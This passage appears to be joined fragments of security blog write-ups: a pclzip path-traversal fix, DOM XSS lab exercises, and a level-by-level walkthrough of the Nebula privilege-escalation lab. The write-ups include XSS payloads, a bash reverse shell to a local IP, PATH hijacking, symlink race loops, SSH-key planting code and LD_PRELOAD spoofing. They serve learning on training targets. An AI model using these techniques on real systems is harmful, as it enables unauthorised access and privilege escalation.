to patch this yourself within the library. Within the pclzip.lib.php itself, When the extract() function is initially called within the library, this will parse the given arguments and set the necessary options. privExtractByRule() function is then executed. This function will extract a file or directory depending on arguments initially provided e.g. by index, by name etc. Within this loaded function, the $p_file_list argument is the array which contains all the properties of the zip file, including the filenames.Within this function, the privExtractFile function is then called (https://github.com/ivanlanin/pclzip/blob/master/pclzip.lib.php#L3424). This function actually does the extraction.Inside this function, it is possible to validate the filename arguments, and based on the rewrite them to remove malicious characters.The following code can be inserted here: https://github.com/ivanlanin/pclzip/blob/master/pclzip.lib.php#L3514        if (strpos($p_entry['stored_filename'], '../') !== false || strpos($p_entry['stored_filename'], '..\\\\') !== false) {            $p_entry['stored_filename'] = basename($p_entry['stored_filename']);            $p_entry['filename'] = basename($p_entry['stored_filename']);            echo $p_entry['stored_filename'];During extraction, the above code will check if the [‘stored_filename’] array value contains .. characters, and if so, will extract the basename of the parameter removing the special characters. E.g. ../../../tmp/foo.txt becomes foo.txt. Then, extraction will continue as normal."

The location.hash value of this window is then reflected back to the user. This can be emulated by creating a new webpage somewhere with the following JavaScript code.&lt;html&gt;&lt;script&gt;window.open('https://domgo.at/cxss/example/9#user=javascript', ':alert(window.location.pathname)');&lt;/script&gt;&lt;/html&gt;When openedm this will open a new window with the user parameter being javascript and the window.name being :alert(window.location.pathname).The “Welcome” link can be clicked to execute JavaScript.Exercise - 10   let urlParts = location.href.split(\"?\");    if (urlParts.length &gt; 1) {                let queryString = urlParts[1];        let queryParts = queryString.split(\"&amp;\");        let userId = \"\";        for (let i = 0; i &lt; queryParts.length; i++) {                        let keyVal = queryParts[i].split(\"=\");            if (keyVal.length &gt; 1) {                if (keyVal[0] === \"user\") {                                        userId = keyVal[1];                    break;                }            }        }        if (userId.startsWith(\"ID-\")) {            userId = userId.substr(3, 10);            userId = userId.replace(/\"/g, \"&amp;quot;\");            let windowValueToUse = window.name.replace(/\"/g, \"&amp;quot;\");            let msg = \"&lt;a href=\\\"\" + userId + windowValueToUse + \"\\\"&gt;Welcome&lt;/a&gt;!!\";            document.getElementById(\"msgboard\").innerHTML = msg;        }    }The source where user input is flowing from is location.hash as part of window.name and the sink where user input ends up is HTMLElement.innerHTML.The value of the parameter user is extracted, this value is then checked to see if the value ID- is present. If so, the value after ID- is extracted, all double quotes are replaced within this parameter and the window.name property. this is then inserted as part of a href link: &lt;a href=\\\"\" + userId + windowValueToUse + \"\\\"&gt;Welcome&lt;/a&gt; which is served to innerHTML.&lt;script&gt;window.open('https://domgo.at/cxss/example/10?lang=en&amp;user=ID-javascript', ':alert(window.location.pathname)');&lt;/script&gt;"

    "content": "This blog post contains a walkthrough of Nebula provided by Exploit Education. Nebula is a vulnerable ISO which has a variety of Linux privilege escalation vulnerabilities. Some of these vulnerabilties includes issues such as SUID files, Permissions, Race conditions etc.After running the ISO, each level can be accessed by sshing into port 22 with the username {level}{levelno}. Instructions regarding each level are also provided within https://exploit.education/nebula/.Level00Link: https://exploit.education/nebula/level-00/The goal of this level is to find a Set User ID program that will run as the “flag00” account. SetUID, which stands for set user ID on execution, is a special type of file permission in Unix which permits users to run certain programs with escalated privileges.In Unix/Linux, the ownership of files and directories is based on the default uid (user-id) and gid (group-id) of the user who created them. When running a program/process within Linux, this process/program has the privilege of the user that ran the program. A SetUID bit can be set on an executable which when executed, will then run under the context of the file owner rather than the user who ran the program. For example, if an executable has the setuid bit set on it, and it’s owned by root, when launched by a normal user, it will run with root privileges.To find all SetUID binaries within a system, the find command can be used with the following arguments:find / -perm -u=s 2&gt;/dev/nullThe / argument is specified to run the command from the top most directory, the -perm option can be used to find files with specific mode. Files with SetUID and SetGID all have different mode numbers. For example, g=w will only match files which have mode 0020 since this is the mode number for files with group write permission set. The -u=s can be used to find files with the mode SetUID set. The /bin/…/flag00 is provided to ignore all stdout errors by sending them to dev/null.level00@nebula:~$ find / -perm -u=s 2&gt;/dev/null/bin/.../flag00/bin/fusermount/bin/mount/bin/ping/bin/ping6/bin/su/bin/umount/sbin/mount.ecryptfs_private/usr/bin/at/usr/bin/chfn/usr/bin/chsh/usr/bin/gpasswd/usr/bin/mtr/usr/bin/newgrp/usr/bin/passwd/usr/bin/sudo/usr/bin/sudoedit/usr/bin/traceroute6.iputils/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/lib/openssh/ssh-keysign/usr/lib/pt_chown/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper/usr/sbin/pppd/usr/sbin/uuidd/rofs/bin/.../flag00/rofs/bin/fusermount/rofs/bin/mount/rofs/bin/ping/rofs/bin/ping6/rofs/bin/su/rofs/bin/umount/rofs/sbin/mount.ecryptfs_private/rofs/usr/bin/at/rofs/usr/bin/chfn/rofs/usr/bin/chsh/rofs/usr/bin/gpasswd/rofs/usr/bin/mtr/rofs/usr/bin/newgrp/rofs/usr/bin/passwd/rofs/usr/bin/sudo/rofs/usr/bin/sudoedit/rofs/usr/bin/traceroute6.iputils/rofs/usr/lib/dbus-1.0/dbus-daemon-launch-helper/rofs/usr/lib/eject/dmcrypt-get-device/rofs/usr/lib/openssh/ssh-keysign/rofs/usr/lib/pt_chown/rofs/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper/rofs/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper/rofs/usr/sbin/pppd/rofs/usr/sbin/uuiddThe /bin/.../flag00 binary can now be run to get the flag.Level01Link: https://exploit.education/nebula/level-01/Level01 provides you with source code of a program that allows arbitrary programs to be executed.#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;int main(int argc, char **argv, char **envp){  gid_t gid;  uid_t uid;  gid = getegid();  uid = geteuid();  setresgid(gid, gid, gid);  setresuid(uid, uid, uid);  system(\"/usr/bin/env echo and now what?\");}Running the binary within the flag01 folder gives the following output.level01@nebula:~$ cd ../flag01level01@nebula:/home/flag01$ ./flag01 and now what?ltrace can be used to debug this binary and understand its functionality. ltrace is a debugging utility which hooks into the dynamic loading system, allowing it to insert shims which display the parameters which the applications uses when making the call, and the return value which the library call reports. It is mainly used to trace Linux system calls.The ltrace output below just explains the source in a functional way where it takes the current uid and gid of the user who executed the binarylevel01@nebula:/home/flag01$ ltrace ./flag01 level01@nebula:/home/flag01$ iduid=1002(level01) gid=1002(level01) groups=1002(level01)__libc_start_main(0x80484a4, 1, 0xbfc49744, 0x8048510, 0x8048580 &lt;unfinished ...&gt;getegid()                                                        = 1002geteuid()                                                        = 1002setresgid(1002, 1002, 1002, 0x288324, 0x287ff4)                  = 0setresuid(1002, 1002, 1002, 0x288324, 0x287ff4)                  = 0system(\"/usr/bin/env echo and now what?\"and now what? &lt;unfinished ...&gt;--- SIGCHLD (Child exited) ---&lt;... system resumed&gt; )                                           = 0+++ exited (status 0) +++Looking at the system call it makes, it is possible to change the path of the echo binary since it is relying on /usr/bin/env to find the full path of the echo binary. The env can be run to see what the PATH environment of a user is, generally it is something like PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games. This output is the list of folders that system checks when a user runs a binary without providing its full path.So complete this challenge, you can change your PATH to be called from an folder that you have write access to such as /home/level01/, and then create a new binary call echo, or a symbolic link which will then execute the getflag binary.Start by creating a file called echo.c within the tmp directory or a directory you have write and execute privileges to and paste the following code:#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main(){  system(\"/bin/bash\");}This can then be compiled into a program as seen below.level01@nebula:/tmp$ vi echo.clevel01@nebula:/tmp$ cc echo.c -o echoOnce you have a dummy echo program, you can then change your environment path to the /tmp directory, meaning everytime the system will check if a binary is within the tmp folder since it doesn’t know the full path. Now when running the flag01 binary this will run the dummy echo program and provide you a bash shell under the context of the flag01 user account. Then the getflag command can be executed.Level02Link: https://exploit.education/nebula/level-02/Level 02 provides you with a program which takes a USER from an environment variable using asprintf. asprint is similar to sprintf, except that it dynamically allocates a string to hold the output, instead of putting the output in a buffer you allocate in advance. This is then given to the system function which invokes an operating system command with the provider “USER” variable.#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;int main(int argc, char **argv, char **envp){  char *buffer;  gid_t gid;  uid_t uid;  gid = getegid();  uid = geteuid();  setresgid(gid, gid, gid);  setresuid(uid, uid, uid);  buffer = NULL;  asprintf(&amp;buffer, \"/bin/echo %s is cool\", getenv(\"USER\"));  printf(\"about to call system(\\\"%s\\\")\\n\", buffer);    system(buffer);}Similar to level01, the environment variable can be changed to something like ; /bin/sh which when taken by the program and is executed as part of the system function results in command injection, successfully provided a shell in the context on flag02.Level03Link: https://exploit.education/nebula/level-03/Level03 provides you with the following files. The hint in the challenge page explains that there is a crontab that is called every couple of minutes.level03@nebula:/home/flag03$ la -latotal 6drwxr-x--- 3 flag03 level03  103 2011-11-20 20:39 .drwxr-xr-x 1 root   root     100 2012-08-27 07:18 ..-rw-r--r-- 1 flag03 flag03   220 2011-05-18 02:54 .bash_logout-rw-r--r-- 1 flag03 flag03  3353 2011-05-18 02:54 .bashrc-rw-r--r-- 1 flag03 flag03   675 2011-05-18 02:54 .profiledrwxrwxrwx 2 flag03 flag03     3 2012-08-18 05:24 writable.d-rwxr-xr-x 1 flag03 flag03    98 2011-11-20 21:22 writable.shlevel03@nebula:/home/flag03$ cat writable.sh #!/bin/shfor i in /home/flag03/writable.d/* ; do\t(ulimit -t 5; bash -x \"$i\")\trm -f \"$i\"donelevel03@nebula:/home/flag03$ ls -la writable.d/total 0drwxrwxrwx 2 flag03 flag03    3 2012-08-18 05:24 .drwxr-x--- 3 flag03 level03 103 2011-11-20 20:39 ..Looking through the files, the writable.sh shell script is world-write-executable and iterates through all files provided within the /home/flag03/writable.d directory and runs thats using the bash terminal. The ulimit command before the bash command controls the max processes per user limit. This just sets the get and set user limit to second 5. The -x argument before bash checks to see if a file is executable before executing it.To solve this challenge, you can create a shell script similar to the following#!/bin/sh/bin/getflag &gt;&gt; /home/flag03/writable.d/flag03.outand wait for it to be executed to get the flagAn alternative way to solve this solution is to create a shell script like the following \"bash -i &gt;&amp; /dev/tcp/192.168.1.8/8080 0&gt;&amp;1\" &gt; shell.sh and run nc -lvp 8080 on your machine. When the shell script executes, it will then give you a reverse shell.Level04Link: https://exploit.education/nebula/level-04/Level04 requires you to read the token file, but the below code restricts the files that can be read.#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;int main(int argc, char **argv, char **envp){  char buf[1024];  int fd, rc;  if(argc == 1) {      printf(\"%s [file to read]\\n\", argv[0]);      exit(EXIT_FAILURE);  }  if(strstr(argv[1], \"token\") != NULL) {      printf(\"You may not access '%s'\\n\", argv[1]);      exit(EXIT_FAILURE);  }  fd = open(argv[1], O_RDONLY);  if(fd == -1) {      err(EXIT_FAILURE, \"Unable to open %s\", argv[1]);  }  rc = read(fd, buf, sizeof(buf));    if(rc == -1) {      err(EXIT_FAILURE, \"Unable to read fd %d\", fd);  }  write(1, buf, rc);}The read function takes a system call used to read data into a buffer and the write function is a system call that is used to write data out of a buffer. The strstr is the function that does the check to see whether the file name matches the string “token” and provides an error if it is true.

The port 18211 is specified by the program and cannot be changed. On the remote host, netcat can be used to receive the file (nv -lvl 18211)By analyzing the source code, it can be determined that the linux access function is used for the check. By reading its man page https://linux.die.net/man/2/access and looking at the warning section, it looks like the access function is vulnerable to race conditions. Further research also points to this http://www.cis.syr.edu/~wedu/Teaching/IntrCompSec/LectureNotes_New/Race_Condition.pdfReading the above lecture notes, this program can be exploited by creating a file the user has access to, then create a symbolic link back to the forbidden token file, then the flag10 program can be run multiple times to trigger the race condition.This works because there is a short time window between executing the access() and open() functions. The window between the checking and using the file results in a Time-of-Check/Time-of-Use (TOCTOU) vulnerability. This is because the system might conduct context switch after access(), and run another process which will run as the flag10 user, so if you can read the file then, the token file will be fetched and successfully sent back.level10@nebula:/tmp$ touch /tmp/accessiblefilelevel10@nebula:/tmp$ while true; do ln -sf /home/flag10/token /tmp/token; \\&gt; ln -sf /tmp/accessiblefile /tmp/token; doneThe above bash liner will create a symbolic link for a file between the token we want to access and a file we have access to, this /tmp/token can now be given to the flag10 program.

The following code block within the main function checks for the value Content Length #define CL “Content-Length: “ along with its length and see if it provided by the user, if these values are not found, then an ‘invalid header’ is produced.if(strncmp(line, CL, strlen(CL)) != 0) {      errx(1, \"invalid header\");  }Looking at the code flow, the program will then check to see if the content length is less than the buffer that was initialized in the beginning of the program. Additonal checks are also conducted with the fread function. The fread function will check the length of the values inserted see if it is 1.      if(fread(buf, length, 1, stdin) != length) {          err(1, \"fread length\");If the length is 1, then the process function is executed. The process function just turns the user input to a random character and feeds it to the system function. This can be tested with the following user input:level11@nebula:/home/flag11$ echo -ne \"Content-Length: 1\\nA\" | /home/flag11/flag11sh: @: command not foundHere we passed the character “A”, when this gets processed by the “process” function, it is converted to the character “@” and is then given to the system command.This can be tried with other characters.

The process function then decodes the char array before passing it into the system() function call. I struggled with this level so I ended up looking for hints on the internet. This gave me the following hint:Since the bash shell is trying to execute a program called shell, we could create a C program which takes the correct SUID information of the flag11 account and runs the bash shell with their privileges. This can then be symlinked (like level 10).This technique however didn’t work due to setuid bit not being set before the call to system. I ended up searching for solutions for this level and found the following working solution: Stack Overflow Nebula Level 11Looking the “else” conditional logic, this part of the program can be triggered during the buffer length check.} else {      int blue = length;      int pink;      fd = getrand(&amp;path);      while(blue &gt; 0) {          printf(\"blue = %d, length = %d, \", blue, length);          pink = fread(buf, 1, sizeof(buf), stdin);          printf(\"pink = %d\\n\", pink);          if(pink &lt;= 0) {              err(1, \"fread fail(blue = %d, length = %d)\", blue, length);          }          write(fd, buf, pink);          blue -= pink;      }          mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);      if(mem == MAP_FAILED) {          err(1, \"mmap\");      }      process(mem, length);  }To abuse this logic, we have to define the environment variable from the shell we run the exploit later on. This can be done using the following command.export TEMP=/tmpLooking at the flag11 folder, another possible attack vector would be to inject a authorized_keys key file within the .ssh folder.This could be possible by injecting into a PID of an process. In old Linux systems, a pid of a process is pretty predictable and srandom() seeded with time is predictable. In this scenario, this PID would need to be predicted while running the flag11 program.An ssh key can be created for the level11 userecho -e \"/tmp/level11.key\" | ssh-keygen -t rsa -b 2048 -C \"level11@nebula\"The public key of the level 11 user can now be taken and the following program can now be created.#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/mman.h&gt;/* * Return a random, non predictable file, and return the file descriptor for it. */int getrand(char **path, int pid, int time){  char *tmp;  int fd =  0;  srandom(time);  tmp = getenv(\"TEMP\");  asprintf(path, \"%s/%d.%c%c%c%c%c%c\", tmp, pid,      'A' + (random() % 26), '0' + (random() % 10),      'a' + (random() % 26), 'A' + (random() % 26),      '0' + (random() % 10), 'a' + (random() % 26));  return fd;}void process(char *buffer, int length){  unsigned int key;  int i;  key = length &amp; 0xff;  for(i = 0; i &lt; length; i++) {    buffer[i] ^= key;    key -= buffer[i] ^ key;  }}#define CL \"Content-Length: \"int main(int argc, char **argv){  char line[256];  char buf[2048] = \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMPbdIp+lS2MR2oGvA36yE4wenUWZUY1OvNyy872Dx3No9LsWFWC6YOCQ4Unea4grPQCYZw/G7EbIgZSnWwW3+sBUASACxJQtQaAKKkK81C1jjarWMZFyN+1EjZqnaVPpj8qF33gOUKg3q2SUyi5p+a7CgzDS7nwYJ4RTdra38Q8K4HgJm1ZrgoKys7SiPnR6BXqq4DOzoJO8UXzwAUPRl0kV/2lRD2lo4LMieudTWKxZk/CQM5UG0TpwhnUmRIyCn3TwlcViSyp6wtzDY8sSekOh9UAdEwvMHAJX//RK3iEVrNz22v1N64RNQmoeNgyb8NYp7fyCxbwVavxHBvMaP level11@nebula\";  int pid;  int fd;  char *path;  FILE* stream;  //process(buf, sizeof(buf));  //if(NULL == (stream = popen(\"/home/flag11/flag11\", \"w\"))) {  //    errx(1, \"popen\");  //}  //printf(\"Get pid for attacked: \\n\");  //if(fgets(line, sizeof(line), stdin) == NULL) {  //    errx(1, \"reading from stdin\");  //}  pid = getpid()+1;  //printf(\"PID: %d\\n\",pid);  getrand(&amp;path, pid, time(NULL));  symlink(\"/home/flag11/.ssh/authorized_keys\",path);  getrand(&amp;path, pid, time(NULL)+1);  symlink(\"/home/flag11/.ssh/authorized_keys\",path);  fprintf(stdout, \"%s%d\\n%s\",CL,sizeof(buf),buf);  //pclose(stream);}            The above attacker code (taken from stackoverflow Nebula Level 11 Solution) can be used to guess the PID of the flag11 binary.

The time part is super easy because it is the time in seconds. To get a stable success rate we also use the filename for the next second. The above can be compiled using GCC.      gcc -o exploit exploit_code.cRunning the exploit provides the following output, but it is possible to SSH as the flag11 user since it was possible to inject into the .ssh folder.level11@nebula:/tmp$ ./exploit | /home/flag11/flag11blue = 2048, length = 2048, pink = 395blue = 1653, length = 2048, pink = 0flag11: fread fail(blue = 1653, length = 2048): Operation not permittedLevel12Link: https://exploit.education/nebula/level-12/Level 12 states that a backdoor exists on port 50001 and the following source code is provided.local socket = require(\"socket\")local server = assert(socket.bind(\"127.0.0.1\", 50001))function hash(password)  prog = io.popen(\"echo \"..password..\" | sha1sum\", \"r\")  data = prog:read(\"*all\")  prog:close()  data = string.sub(data, 1, 40)  return dataendwhile 1 do  local client = server:accept()  client:send(\"Password: \")  client:settimeout(60)  local line, err = client:receive()  if not err then      print(\"trying \" .. line) -- log from where ;\\      local h = hash(line)      if h ~= \"4754a4f4bd5787accd33de887b9250a0691dd198\" then          client:send(\"Better luck next time\\n\");      else          client:send(\"Congrats, your token is 413**CARRIER LOST**\\n\")      end  end  client:close()endThe following program takes user input and uses the hash function check whether the user input password matches the password hash “4754a4f4bd5787accd33de887b9250a0691dd198”. The issue here arises from the usage of the popen function which is vulnerable to command injection. As such, you can execute arbitrary commands by injection metacharacters such as ; and |.Level13Link: https://exploit.education/nebula/level-13/Level 13 states that a security check is in place that prevents the program from continuing execution if the user invoking it does not match a specific user id. The following source code is provided.#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;string.h&gt;#define FAKEUID 1000int main(int argc, char **argv, char **envp){  int c;  char token[256];  if(getuid() != FAKEUID) {      printf(\"Security failure detected. UID %d started us, we expect %d\\n\", getuid(), FAKEUID);      printf(\"The system administrators will be notified of this violation\\n\");      exit(EXIT_FAILURE);  }  // snip, sorry :)  printf(\"your token is %s\\n\", token);  }The security check if verifying whether the UID is 1000. If it isn’t, an error message is printed, otherwise the token is printed. This check can be bypassed by using LD_PRELOAD function to load a shared object file containing a custom getuid() function. Shared libraries are libraries that are loaded by programs when they start. When a shared library is installed properly, all programs that start afterward automatically use the new shared library. The LD_PRELOAD trick exploits functionality provided by the dynamic linker on Unix systems that allows you to tell the linker to bind symbols provided by a certain shared library before other libraries.Using LD_PRELOAD, it is not possible to run SUID binaries. However, it is possible to make a copy of the flag13 binary without the SUID bit set and LDF_PRELOAD can be used to spoof the suid bit, this can then be used to get the token which can be used to SSH as the flag13 user.The following C shared library can be created which returns the UID 1000.int getuid() {    return 1000;}This can then be compiled, set as a shared library and then ran with a copy of the flag13 binary.level13@nebula:~$ gcc -shared -fPIC -o fakesuid.so fakesuid.c      level13@nebula:~$ LD_PRELOAD=/home/level13/fakesuid.so /home/level13/flag13_backup your token is b705702b-76a8-42b0-8844-3adabbe5ac58level13@nebula:~$ Level14Link: https://exploit.education/nebula/level-14/Level 14 states that a program resides in /home/flag14/flag14. It encrypts input and writes it to standard output. An encrypted token file is also in that home directory.Running the binary with random test input, the following can be deduced:level14@nebula:/home/flag14$ ./flag14 ./flag14\t-e\tEncrypt inputlevel14@nebula:/home/flag14$ ./flag14 -eaaaaaaaaaaaaaaaaaaabcdefghijklmnopqr\u001c\u001d^Clevel14@nebula:/home/flag14$ ./flag14 -ebbbbbbbbbbbbbbbbbbbcdefghijklmnopqrs\u001clevel14@nebula:/home/flag14$ ./flag14 -e12345678913579;=?A\u0013It appears that each character is rotated by its index, starting with 0. So a becomes a, a[1] becomes b (ax1), a[2] becomes c (ax2) etc.The following python code can be used to reverse this process. It enumerates through each value in the encrypted token gets the original value by subtracting the ord(index) of the value with its ASCII table value.token = '857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.'count = 0result = []for value in token:  result.append(chr((ord(value) - count)))  count +=1print (\"\".join(result))Running this program will return the following token: 8457c118-887c-4e40-a5a6-33a25353165. This can be used to log in to the flag 14 user account.Level15Link: https://exploit.education/nebula/level-15/Level 15 gives the following information:strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.You may wish to review how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.Clean up after yourself :)To do this level, log in as the level15 account with the password level15.

When a shared library is installed properly, all programs that start afterward automatically use the new shared library. very shared library has a special name called the “soname”. The soname has the prefix “lib”, the name of the library, the phrase `”.so”, followed by a period and a version number. The dynamic linker can be run either indirectly by running some dynamically linked program or shared object. The programs ld.so and ld-linux.so* find and load the shared objects (shared libraries) needed by a program, prepare the program to run, and then run it. LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library. To avoid this mechanism being used as an attack vector for suid/sgid executable binaries, the loader ignores LD_PRELOAD if ruid != euid. For such binaries, only libraries in standard paths that are also suid/sgid will be preloaded.The RPATH of the binary can also be found by using objdump. RPATH is used by the dynamic linker at run time to search for shared libraries related to a binary. As mentioned, the loader ignores LD_PRELOAD if ruid != euid but this doesn’t apply to standard RPATH.level15@nebula:/home/flag15$ objdump -p flag15 flag15:     file format elf32-i386Program Header:    PHDR off    0x00000034 vaddr 0x08048034 paddr 0x08048034 align 2**2         filesz 0x00000120 memsz 0x00000120 flags r-x  INTERP off    0x00000154 vaddr 0x08048154 paddr 0x08048154 align 2**0         filesz 0x00000013 memsz 0x00000013 flags r--    LOAD off    0x00000000 vaddr 0x08048000 paddr 0x08048000 align 2**12         filesz 0x000005d4 memsz 0x000005d4 flags r-x    LOAD off    0x00000f0c vaddr 0x08049f0c paddr 0x08049f0c align 2**12         filesz 0x00000108 memsz 0x00000110 flags rw- DYNAMIC off    0x00000f20 vaddr 0x08049f20 paddr 0x08049f20 align 2**2         filesz 0x000000d0 memsz 0x000000d0 flags rw-    NOTE off    0x00000168 vaddr 0x08048168 paddr 0x08048168 align 2**2         filesz 0x00000044 memsz 0x00000044 flags r--EH_FRAME off    0x000004dc vaddr 0x080484dc paddr 0x080484dc align 2**2         filesz 0x00000034 memsz 0x00000034 flags r--   STACK off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**2         filesz 0x00000000 memsz 0x00000000 flags rw-   RELRO off    0x00000f0c vaddr 0x08049f0c paddr 0x08049f0c align 2**0         filesz 0x000000f4 memsz 0x000000f4 flags r--Dynamic Section:  NEEDED               libc.so.6  RPATH                /var/tmp/flag15  INIT                 0x080482c0  FINI                 0x080484ac  GNU_HASH             0x080481ac  STRTAB               0x0804821c  SYMTAB               0x080481cc  STRSZ                0x0000005a  SYMENT               0x00000010  DEBUG                0x00000000  PLTGOT               0x08049ff4  PLTRELSZ             0x00000018  PLTREL               0x00000011  JMPREL               0x080482a8  REL                  0x080482a0  RELSZ                0x00000008  RELENT               0x00000008  VERNEED              0x08048280  VERNEEDNUM           0x00000001  VERSYM               0x08048276Version References:  required from libc.so.6:    0x0d696910 0x00 02 GLIBC_2.0The program loads the shared libraries before it executes, if we create a custom shared library with the same name of libc.so.6 then place it under rpath is set (/var/tmp/flag16), the program running with flag16 privilege will execute my custom code.A shared library can be created by creating a C file and creating the libc_start_main function which can have a system call to the /bin/bash binary. libc_start_main is a function that belongs to libc.so.6, responsible for setting up the environment for our process and, after that, call main function. You will also need to provide the __cxa_finalize symbol or else the C code will return with an exit status.

As such, if an fopen() call returns NULL, it is possible to skip the if conditional block and be loggedin.#define PWFILE \"/home/flag18/password\"void login(char *pw){  FILE *fp;  fp = fopen(PWFILE, \"r\");  if(fp) {      char file[64];      if(fgets(file, sizeof(file) - 1, fp) == NULL) {          dprintf(\"Unable to read password file %s\\n\", PWFILE);          return;      }                fclose(fp);      if(strcmp(pw, file) != 0) return;         }  dprintf(\"logged in successfully (with%s password file)\\n\",      fp == NULL ? \"out\" : \"\");    globals.loggedin = 1;}}One way to get the fopen() call to return NULL is by exhausting the system’s available file descriptors.

This option can be modified by the current user:level18@nebula:~$ ulimit -Sa |grep filesopen files                      (-n) 1024level18@nebula:~$ ulimit -Ha |grep filesopen files                      (-n) 4096level18@nebula:~$By knowing that 1024 is the open file limit, one way to solve this challenge is to exhaust the filedescriptors up all system file handlers and then call the flag18 program’s login command that will fail opening the password file and will set the loggedin flag to 1. 3 descriptors should also be spared for stdin, stdout and stderr so it is possible to run getflag after running the program.level18@nebula:/tmp$ python -c 'print(\"login foo\\n\"*1021)' &gt; /home/level18/foolevel18@nebula:/tmp$ python -c 'print(\"closelog\")' &gt;&gt; /home/level18/foolevel18@nebula:/tmp$  python -c 'print(\"shell\")' &gt;&gt; /home/level18/foolevel18@nebula:/tmp$ cat /home/level18/foo | /home/flag18/flag18 -d /dev/ttyStarting up. Verbose level = 0logged in successfully (without password file)The above python script tries to login 1021 times, closes the connection and gets a system shell. This can then be used to run the flag program and a /dev/tty can be specified to get a shell.In the above command, anything specified after the -d parameter and anything following it to be ignored. We can achieve this by passing either –init-file or –rcfile as our first argument to flag18. The -d parameter will then be ignored by bashLevel19Link: https://exploit.education/nebula/level-19/Level 19 provides the following source and mentions that there is a flaw in the below program in how it operates.#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;int main(int argc, char **argv, char **envp){  pid_t pid;  char buf[256];  struct stat statbuf;  /* Get the parent's /proc entry, so we can verify its user id */  snprintf(buf, sizeof(buf)-1, \"/proc/%d\", getppid());  /* stat() it */  if(stat(buf, &amp;statbuf) == -1) {      printf(\"Unable to check parent process\\n\");      exit(EXIT_FAILURE);  }  /* check the owner id */  if(statbuf.st_uid == 0) {      /* If root started us, it is ok to start the shell */      execve(\"/bin/sh\", argv, envp);      err(1, \"Unable to execve\");  }  printf(\"You are unauthorized to run this program\\n\");}By looking at the above program, it executes a shell if the parent process was started by root. Within the program itself, getppid is used to achieve this. getppid returns the pid of the parent of the calling process is what defines whether a shell should be given or not. getppid returns the PID of init e.g. 1 and /proc/1 is owned by root. The way to solve this challenge is to kill the parent process which called the flag19 program before the program calls getppid.#include &lt;unistd.h&gt;int main(int argc, char **argv, char **envp) {    int childPID = fork();    if(childPID &gt;= 0) { // forked        if(childPID == 0) { // child            sleep(1);            setresuid(geteuid(),geteuid(),geteuid());            char *args[] = {\"/bin/sh\", \"-c\", \"/bin/getflag\", NULL};            execve(\"/home/flag19/flag19\", args, envp);        }    }    return 0;}The above program creates a process using fork. Fork system call is used for creating a new process, which is called child process, which runs concurrently with the process that makes the fork() call (parent process). After a new child process is created, both processes will execute the next instruction following the fork() system call. sleep is then used to force create an orphan process that would be claimed by init, which is owned by root. Then the exec call is done to run the flag19 program which is execute the getflag command.This brings to the end Exploit Exercises Nebula. Overall, the challenges were great fun and difficulty increased throughout and required me to look at multiple writeups online to complete this."

This could be possible through SQL injection or brute force of the secret value/field. Looking at the source code, prepared statements seems to be in use.  $statement = $db-&gt;prepare(    \"SELECT name FROM products WHERE name = ? AND secret = ?\"  );  check_errors($statement);  $statement-&gt;bind_param(\"ss\", $name, $secret);Futhermore, the secret value is also hashed using SHA256 and compared to the one in the database. Looking at the source code, it also not possible to confuse the application by inserting the same product name since checks are in place.    $product = get_product($name);    if ($product !== null) {      return \"Product name already exists, please enter again\";    }However the following code looks like an entry pointfunction get_product($name) {  global $db;  $statement = $db-&gt;prepare(    \"SELECT name, description FROM products WHERE name = ?\"  );  check_errors($statement);  $statement-&gt;bind_param(\"s\", $name);  check_errors($statement-&gt;execute());  $res = $statement-&gt;get_result();  check_errors($res);  $product = $res-&gt;fetch_assoc();  $statement-&gt;close();  return $product;}Tracing the code to where it is being called (see below), the following can be deduced.The check_name_secret function checks if a product exists with the entered name and secret value. However, the get_product function only returns one row from the database by using the name parameter. As such, you could add another product called facebook with a secret and get the application program to return the first already creadted product found with the name facebook.function handle_post() {  global $_POST;  $name = $_POST[\"name\"];  $secret = $_POST[\"secret\"];  if (isset($name) &amp;&amp; $name !== \"\"        &amp;&amp; isset($secret) &amp;&amp; $secret !== \"\") {    if (check_name_secret($name, hash('sha256', $secret)) === false) {      return \"Incorrect name or secret, please try again\";    }    $product = get_product($name);    echo \"&lt;p&gt;Product details:\";    echo \"&lt;ul&gt;&lt;li&gt;\" . htmlentities($product['name']) . \"&lt;/li&gt;\";    echo \"&lt;li&gt;\" . htmlentities($product['description']) . \"&lt;/li&gt;&lt;/ul&gt;&lt;/p&gt;\";  }  return null;}This vulnerability could be exploited using a vulnerability similiar to SQL Truncation Attack. This is due to MySQL comparing values within taking into account trailing spaces. Here we will enter a product with spaces e.g. facebook into the application which will be stored within the database. This will then become facebook when we try to view the product again due to the comparison issue and we can view the facebook product to acquire our flag.The flag can 